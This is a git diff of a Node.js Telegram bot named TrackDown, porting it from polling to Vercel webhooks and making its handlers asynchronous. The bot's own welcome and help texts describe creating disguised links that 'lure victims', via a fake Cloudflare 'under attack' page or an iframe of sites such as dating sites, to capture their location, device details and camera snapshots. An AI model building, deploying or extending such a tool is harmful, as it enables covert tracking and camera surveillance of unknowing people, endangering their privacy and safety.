@@ -17,7 +17,8 @@ if (!botToken) {
 
 console.log('🤖 Bot token found:', botToken.substring(0, 10) + '...');
 
-const bot = new TelegramBot(botToken, {polling: true});
+// For Vercel, we use webhooks instead of polling
+const bot = new TelegramBot(botToken, {polling: false});
 
 // Test bot connection
 bot.getMe().then((botInfo) => {
@@ -40,6 +41,82 @@ app.set("view engine", "ejs");
 var hostURL=config.hostURL;
 //TOGGLE for Shorters
 var use1pt=config.use1pt;
+
+// Webhook endpoint for Telegram bot
+app.post("/webhook", async (req, res) => {
+  try {
+    const { message, callback_query } = req.body;
+    
+    if (message) {
+      await handleMessage(message);
+    } else if (callback_query) {
+      await handleCallbackQuery(callback_query);
+    }
+    
+    res.status(200).send('OK');
+  } catch (error) {
+    console.error('Webhook error:', error);
+    res.status(500).send('Error');
+  }
+});
+
+// Set webhook URL (call this once to set up the webhook)
+app.get("/set-webhook", async (req, res) => {
+  try {
+    const webhookUrl = `${hostURL}/webhook`;
+    await bot.setWebhook(webhookUrl);
+    res.json({ success: true, webhookUrl });
+  } catch (error) {
+    console.error('Set webhook error:', error);
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// Remove webhook (for testing)
+app.get("/remove-webhook", async (req, res) => {
+  try {
+    await bot.deleteWebhook();
+    res.json({ success: true, message: 'Webhook removed' });
+  } catch (error) {
+    console.error('Remove webhook error:', error);
+    res.status(500).json({ error: error.message });
+  }
+});
+
+async function handleMessage(msg) {
+  const chatId = msg.chat.id;
+  console.log('📨 Received message from:', msg.chat.first_name, '(ID:', chatId + ')');
+
+  if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
+    await createLink(chatId, msg.text);
+  }
+  
+  if(msg.text=="/start"){
+    var m={
+      reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
+    };
+    await bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`, m);
+  }
+  else if(msg.text=="/create"){
+    await createNew(chatId);
+  }
+  else if(msg.text=="/help"){
+    await bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving the url it will send you 2 links which you can use to track people.
+\n\nSpecifications.
+\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
+\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
+( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
+\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
+`);
+  }
+}
+
+async function handleCallbackQuery(callbackQuery) {
+  await bot.answerCallbackQuery(callbackQuery.id);
+  if(callbackQuery.data=="crenew"){
+    await createNew(callbackQuery.message.chat.id);
+  }
+}
 
 
 
@@ -93,50 +170,7 @@ res.redirect("https://t.me/th30neand0nly0ne");
 
 
 
-bot.on('message', async (msg) => {
-const chatId = msg.chat.id;
-
-console.log('📨 Received message from:', msg.chat.first_name, '(ID:', chatId + ')');
-
-if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
- createLink(chatId,msg.text); 
-}
-  
-if(msg.text=="/start"){
-var m={
-reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
-};
-
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
-}
-else if(msg.text=="/create"){
-createNew(chatId);
-}
-else if(msg.text=="/help"){
-bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
-to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
-the url it will send you 2 links which you can use to track people.
-\n\nSpecifications.
-\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
-\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
-( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
-`);
-}
-  
-  
-});
-
-bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
-bot.answerCallbackQuery(callbackQuery.id);
-if(callbackQuery.data=="crenew"){
-createNew(callbackQuery.message.chat.id);
-} 
-});
-bot.on('polling_error', (error) => {
-console.error('❌ Bot polling error:', error.message);
-console.error('🔧 Error code:', error.code);
-});
+// Bot event handlers are now handled in the webhook endpoint
 
 
 
@@ -159,7 +193,7 @@ var m={
 var cUrl=`${hostURL}/c/${url}`;
 var wUrl=`${hostURL}/w/${url}`;
   
-bot.sendChatAction(cid,"typing");
+await bot.sendChatAction(cid,"typing");
 if(use1pt){
 var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
 var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
@@ -174,26 +208,26 @@ for(var c in y){
 g+=y[c]+"\n";
 }
   
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
+await bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
 }
 else{
 
-bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
+await bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
 }
 }
 else{
-bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
-createNew(cid);
+await bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
+await createNew(cid);
 
 }  
 }
 
 
-function createNew(cid){
+async function createNew(cid){
 var mk={
 reply_markup:JSON.stringify({"force_reply":true})
 };
-bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
+await bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
 }
 
 
@@ -203,7 +237,7 @@ bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
 app.get("/", (req, res) => {
 var ip;
 if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
-res.json({"ip":ip});
+res.json({"ip":ip, "status": "TrackDown Bot is running on Vercel!", "webhook": `${hostURL}/webhook`});
 
   
 });
@@ -281,10 +315,6 @@ res.send("Done");
 
 
 
-const PORT = process.env.PORT || 5000;
-app.listen(PORT, () => {
-console.log(`🚀 TrackDown Bot is running on port ${PORT}!`);
-console.log(`🌐 Web server: http://localhost:${PORT}`);
-console.log(`🤖 Bot token: ${botToken.substring(0, 10)}...`);
-console.log(`📱 Host URL: ${hostURL}`);
-});
+// For Vercel, we export the app instead of listening on a port
+// The app will be handled by Vercel's serverless functions
+module.exports = app;
